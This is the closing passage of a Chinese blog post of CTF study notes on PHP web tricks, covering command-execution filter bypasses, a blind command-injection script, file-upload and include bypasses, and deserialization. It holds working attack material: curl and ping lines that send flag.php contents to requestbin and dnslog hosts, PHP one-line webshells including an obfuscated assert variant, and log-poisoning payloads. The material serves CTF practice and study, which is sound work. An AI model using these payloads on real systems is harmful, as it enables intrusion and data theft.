class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//通过$ffi去调用system函数</span></span><br><span class="line"><span class="number">20</span>.环境变量取字母拼接命令</span><br><span class="line"><span class="comment">//$PATH最后一位是n：/bin</span></span><br><span class="line">$&#123;PATH:~<span class="number">0</span>&#125;</span><br><span class="line">$&#123;PATH:~A&#125;<span class="comment">//0和字母均代表最后一位</span></span><br><span class="line"><span class="comment">//$PWD最后一位是l:/var/www/html</span></span><br><span class="line">$&#123;HOME&#125;</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$&#123;IFS&#125;????.???<span class="comment">//flag.php</span></span><br><span class="line">$&#123;PHP_VERSION:$&#123;PHP_VERSION:~A&#125;:~$&#123;SHLVL&#125;&#125;<span class="comment">//3</span></span><br><span class="line">$&#123;PHP_CFLAGS:<span class="number">3</span>:<span class="number">3</span>&#125;<span class="comment">//cat</span></span><br><span class="line">$&#123;PWD::$&#123;<span class="comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span></span><br><span class="line">$? <span class="comment">//上一次执行的命令，1为不正常，0为正常</span></span><br><span class="line">&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???<span class="comment">#可能存在成功的机会，不断刷新</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/06/08/tnSLOwqyuvQXAl7.png" alt="20220608021618"></p>
<h2 id="命令盲注"><a href="#命令盲注" class="headerlink" title="命令盲注"></a>命令盲注</h2><p>脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.digits+string.ascii_lowercase+<span class="string">&quot;-&quot;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">key=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="comment">#print(j)</span></span><br><span class="line">    <span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        payload=<span class="string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(j,n)</span><br><span class="line">        url=<span class="string">&quot;http://5fd5973f-3879-413f-9bfc-f3913f618e5f.challenge.ctf.show/?c=&quot;</span>+payload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result=result+n</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h2 id="oob"><a href="#oob" class="headerlink" title="oob"></a>oob</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.?F=`<span class="variable">$F</span>`;+curl -X POST -F xx=@flag.php  http:<span class="comment">//生成的域名</span></span><br><span class="line"><span class="comment">//xx是上传文件的name值，可随便写。flag.php就是上传的文件,前面要加@表示是文件</span></span><br><span class="line"><span class="number">2</span>.?F=`<span class="variable">$F</span>`;+curl  http:<span class="comment">//requestbin.net/r/1puo0jq1?p=`cat test.php` </span></span><br><span class="line"><span class="number">3</span>.ping `cat flag.php|awk <span class="string">&#x27;NR==2&#x27;</span>`<span class="number">.6</span>x1sys.dnslog.cn</span><br><span class="line">nl flag.php|awk <span class="string">&quot;NR==16&quot;</span>|tr -cd <span class="string">&quot;[a-z]&quot;</span>/<span class="string">&quot;[0-9]&quot;</span><span class="comment">//注意前面会有行号</span></span><br><span class="line">awk <span class="comment">//选择行</span></span><br><span class="line">tr <span class="comment">//选择符合正则表达式的输出，过滤&#123;&#125;,-等特殊符号</span></span><br></pre></td></tr></table></figure>
<h1 id="十、文件上传"><a href="#十、文件上传" class="headerlink" title="十、文件上传"></a>十、文件上传</h1><p>一句话木马：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo%20phpinfo();&quot;</span>);<span class="comment">//注意eval里一定要有引号和分号结束，以及echo不能再接引号了，否则要转义</span></span><br><span class="line"><span class="variable">$poc</span>=<span class="string">&quot;a#s#s#e#r#t&quot;</span>; <span class="variable">$poc_1</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$poc</span>); <span class="variable">$poc_2</span>=<span class="variable">$poc_1</span>[<span class="number">0</span>].<span class="variable">$poc_1</span>[<span class="number">1</span>].<span class="variable">$poc_1</span>[<span class="number">2</span>].<span class="variable">$poc_1</span>[<span class="number">3</span>].<span class="variable">$poc_1</span>[<span class="number">4</span>].<span class="variable">$poc_1</span>[<span class="number">5</span>]; <span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>])<span class="comment">//过狗一句话</span></span><br></pre></td></tr></table></figure>
<h2 id="后缀名绕过"><a href="#后缀名绕过" class="headerlink" title="后缀名绕过"></a>后缀名绕过</h2><p>1.%00截断<br>2.py</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;find /* |grep flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="路径绕过"><a href="#路径绕过" class="headerlink" title="路径绕过"></a>路径绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./ ../ /</span><br><span class="line">在文件名后面加/</span><br></pre></td></tr></table></figure>
<h2 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h2><p>31 31 31&#x3D;&gt;89 50 4e 47 0d 0a</p>
<h2 id="htaccess解析绕过"><a href="#htaccess解析绕过" class="headerlink" title=".htaccess解析绕过"></a>.htaccess解析绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>
<h2 id="内容绕过"><a href="#内容绕过" class="headerlink" title="内容绕过"></a>内容绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#\w&#123;2,&#125;|[678]|&lt;\?|/#&#x27;</span>,<span class="variable">$content</span>);<span class="comment">//不能出现2个及以上字母或数字|&lt;?|/</span></span><br></pre></td></tr></table></figure>
<p>1.用字符串连接符.绕过<br>2.可变函数绕过(注意eval函数不能用)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = &#x27;a&#x27;.&#x27;s&#x27;.&#x27;s&#x27;.&#x27;e&#x27;.&#x27;r&#x27;.&#x27;t&#x27;</span><br><span class="line">$a();</span><br></pre></td></tr></table></figure>
<p>3.结尾的结束符?&gt;可忽略，因为php是动态脚本<br>4.短标签绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="meta">?&gt;</span> <span class="comment">//所有情况可用</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="meta">?&gt;</span> <span class="comment">//需开启短标签</span></span><br><span class="line">&lt;script language=<span class="string">&quot;PHP&quot;</span>&gt; &lt;script/&gt;</span><br></pre></td></tr></table></figure>
<p>5.eval,assert<br>6.system,wget,nc,exec,passthru,netcat,curl </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl `cat flag.php|grep <span class="string">&quot;flag&quot;</span>`.当时创建的域名 <span class="comment">//dnslog</span></span><br></pre></td></tr></table></figure>
<h2 id="文件包含绕过"><a href="#文件包含绕过" class="headerlink" title="文件包含绕过"></a>文件包含绕过</h2><p>有?file&#x3D;upload.php的<br>直接访问图片是没用的。菜刀连接的url要包含?file&#x3D;才行<br>1.文件包含不管后缀名是什么，只要含有&lt;?php 内容即可,所以可配合图片马(包含可以解析出来)或.log<br>2.phar能把压缩文件解压读取，即使这个压缩文件的后缀名改了也可以。所以上传一个getshell的压缩文件，后缀名改成jpg或者其他。然后通过phar:&#x2F;&#x2F;读取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.test.php</span><br><span class="line"><span class="number">2</span>.压缩后改后缀名为jpg</span><br><span class="line"><span class="number">3</span>.<span class="keyword">include</span>(<span class="string">&quot;zip://t.zip#t.php&quot;</span>);</span><br><span class="line">或<span class="keyword">include</span>(<span class="string">&quot;phar://a.phar/a.php&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="非预期绕过"><a href="#非预期绕过" class="headerlink" title="非预期绕过"></a>非预期绕过</h2><p>把一句话写到访问日志里面<br>使用条件:post提交ctf&#x3D;&#x2F;etc&#x2F;passwd,有回显,我们可以日志文件包含还有session包含(如果clean up开启就不行,需要条件竞争 )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">先在User-Agent注入php代码<span class="comment">//只有一次机会</span></span><br><span class="line">ctf=/<span class="keyword">var</span>/log/nginx/access.log   ctf=/<span class="keyword">var</span>/log/apache/access.log</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/06/07/kMV7Hl6ONaWYJDU.png" alt="20220607212037"><br><img src="https://s2.loli.net/2022/06/07/OL675yudzZkmgXa.png" alt="20220607212052"></p>
<h1 id="十一、反序列化"><a href="#十一、反序列化" class="headerlink" title="十一、反序列化"></a>十一、反序列化</h1><p>序列化只保留成员变量不保留函数方法，所以修改也只能修改变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">&quot;ctfShowUser&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxa&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVip&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>1.重新构造一个同名相似类，覆盖掉一些特征</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br></pre></td></tr></table></figure>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><hr>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>1.<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">p神博客</a></p>
</div><div class="article-licensing box"><div class="licensing-title"><p><a href="https://sx-zhang.top/2022/05/29/web/PHP的tricks/">https://sx-zhang.top/2022/05/29/web/PHP的tricks/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Shixuan Zhang</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-05-29</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2022-06-25</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/php/">php</a></div><div class="sharethis-inline-share-buttons"></div><script src="https://platform-api.sharethis.com/js/sharethis.js#property=6250f03420c5f3001916ab7f&amp;product=inline-share-buttons" defer></script></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2022/06/09/misc/%E9%9A%90%E5%86%99%E6%9C%AF/"><i class="level-item fas fa-chevron-left"></i><span class="level-item"> </span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/05/28/web/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><span class="level-item"> </span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "433872ce2bf4f2941344066af923fd5f",
            repo: "gittalk-comments",
            owner: "zhangsx19",
            clientID: "58a3f2f97d6428a7b995",
            clientSecret: "88106c2d09c6d5803d639decb5bc2d0a3b0d443d",
            admin: ["zhangsx19"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 20,
            pagerDirection: "last",
            
            
            enableHotKey: true,
            language: "zh-CN",
        })
        gitalk.render('comment-container')</script></div></div></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#搭建环境"><span class="level-left"><span class="level-item">搭建环境</span></span></a></li><li><a class="level is-mobile" href="#一-伪随机数"><span class="level-left"><span class="level-item">一.伪随机数</span></span></a></li><li><a class="level is-mobile" href="#二、函数"><span class="level-left"><span class="level-item">二、函数</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#intval"><span class="level-left"><span class="level-item">intval</span></span></a></li><li><a class="level is-mobile" href="#preg-match"><span class="level-left"><span class="level-item">preg_match()</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#正则表达式"><span class="level-left"><span class="level-item">正则表达式</span></span></a></li><li><a class="level is-mobile" href="#绕过方法："><span class="level-left"><span class="level-item">绕过方法：</span></span></a></li></ul></li><li><a class="level is-mobile" href="#ereg-eregi"><span class="level-left"><span class="level-item">ereg(),eregi()</span></span></a></li><li><a class="level is-mobile" href="#highlight-file"><span class="level-left"><span class="level-item">highlight_file</span></span></a></li><li><a class="level is-mobile" href="#file-put-contents-文件名，内容"><span class="level-left"><span class="level-item">file_put_contents(文件名，内容)</span></span></a></li><li><a class="level is-mobile" href="#in-array"><span class="level-left"><span class="level-item">in_array()</span></span></a></li><li><a class="level is-mobile" href="#is-numeric"><span class="level-left"><span class="level-item">is_numeric</span></span></a></li><li><a class="level is-mobile" href="#is-file"><span class="level-left"><span class="level-item">is_file</span></span></a></li><li><a class="level is-mobile" href="#回调函数"><span class="level-left"><span class="level-item">回调函数</span></span></a></li><li><a class="level is-mobile" href="#无参函数"><span class="level-left"><span class="level-item">无参函数</span></span></a></li><li><a class="level is-mobile" href="#parse-str"><span class="level-left"><span class="level-item">parse_str</span></span></a></li><li><a class="level is-mobile" href="#eval-assert"><span class="level-left"><span class="level-item">eval,assert</span></span></a></li><li><a class="level is-mobile" href="#base-convert-number-frombase-tobase"><span class="level-left"><span class="level-item">base_convert(number,frombase,tobase);</span></span></a></li><li><a class="level is-mobile" href="#魔术方法"><span class="level-left"><span class="level-item">魔术方法</span></span></a></li><li><a class="level is-mobile" href="#匿名函数"><span class="level-left"><span class="level-item">匿名函数</span></span></a></li></ul></li><li><a class="level is-mobile" href="#三、字符串"><span class="level-left"><span class="level-item">三、字符串</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#strpos"><span class="level-left"><span class="level-item">strpos</span></span></a></li><li><a class="level is-mobile" href="#str-replace"><span class="level-left"><span class="level-item">str_replace</span></span></a></li><li><a class="level is-mobile" href="#strtr"><span class="level-left"><span class="level-item">strtr</span></span></a></li></ul></li><li><a class="level is-mobile" href="#四、md5、sha1"><span class="level-left"><span class="level-item">四、md5、sha1</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#弱类型比较"><span class="level-left"><span class="level-item">弱类型比较</span></span></a></li><li><a class="level is-mobile" href="#x3D-x3D-x3D-数组碰撞"><span class="level-left"><span class="level-item">===数组碰撞</span></span></a></li></ul></li><li><a class="level is-mobile" href="#五、运算符"><span class="level-left"><span class="level-item">五、运算符</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#and"><span class="level-left"><span class="level-item">and</span></span></a></li><li><a class="level is-mobile" href="#amp-amp"><span class="level-left"><span class="level-item">&amp;&amp; ||</span></span></a></li></ul></li><li><a class="level is-mobile" href="#六、类"><span class="level-left"><span class="level-item">六、类</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#内置类"><span class="level-left"><span class="level-item">内置类</span></span></a></li></ul></li><li><a class="level is-mobile" href="#七、文件包含"><span class="level-left"><span class="level-item">七、文件包含</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#伪协议"><span class="level-left"><span class="level-item">伪协议</span></span></a></li><li><a class="level is-mobile" href="#日志getshell"><span class="level-left"><span class="level-item">日志getshell</span></span></a></li><li><a class="level is-mobile" href="#利用session对话"><span class="level-left"><span class="level-item">利用session对话</span></span></a></li><li><a class="level is-mobile" href="#利用php-x2F-x2F-filter绕开exit"><span class="level-left"><span class="level-item">利用php://filter绕开exit</span></span></a></li></ul></li><li><a class="level is-mobile" href="#八、变量"><span class="level-left"><span class="level-item">八、变量</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#全局变量"><span class="level-left"><span class="level-item">全局变量</span></span></a></li><li><a class="level is-mobile" href="#SERVER"><span class="level-left"><span class="level-item">$_SERVER</span></span></a></li><li><a class="level is-mobile" href="#变量覆盖"><span class="level-left"><span class="level-item">变量覆盖</span></span></a></li></ul></li><li><a class="level is-mobile" href="#九、命令执行"><span class="level-left"><span class="level-item">九、命令执行</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#命令盲注"><span class="level-left"><span class="level-item">命令盲注</span></span></a></li><li><a class="level is-mobile" href="#oob"><span class="level-left"><span class="level-item">oob</span></span></a></li></ul></li><li><a class="level is-mobile" href="#十、文件上传"><span class="level-left"><span class="level-item">十、文件上传</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#后缀名绕过"><span class="level-left"><span class="level-item">后缀名绕过</span></span></a></li><li><a class="level is-mobile" href="#路径绕过"><span class="level-left"><span class="level-item">路径绕过</span></span></a></li><li><a class="level is-mobile" href="#文件头绕过"><span class="level-left"><span class="level-item">文件头绕过</span></span></a></li><li><a class="level is-mobile" href="#htaccess解析绕过"><span class="level-left"><span class="level-item">.htaccess解析绕过</span></span></a></li><li><a class="level is-mobile" href="#内容绕过"><span class="level-left"><span class="level-item">内容绕过</span></span></a></li><li><a class="level is-mobile" href="#文件包含绕过"><span class="level-left"><span class="level-item">文件包含绕过</span></span></a></li><li><a class="level is-mobile" href="#非预期绕过"><span class="level-left"><span class="level-item">非预期绕过</span></span></a></li></ul></li><li><a class="level is-mobile" href="#十一、反序列化"><span class="level-left"><span class="level-item">十一、反序列化</span></span></a></li><li><a class="level is-mobile" href="#其他"><span class="level-left"><span class="level-item">其他</span></span></a></li><li><a class="level is-mobile" href="#参考"><span class="level-left"><span class="level-item">参考</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/mylogo.jpg" alt="sx-zhang" height="28"></a><p class="is-size-7"><span>&copy; 2022 Shixuan Zhang</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/zhangsx19"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>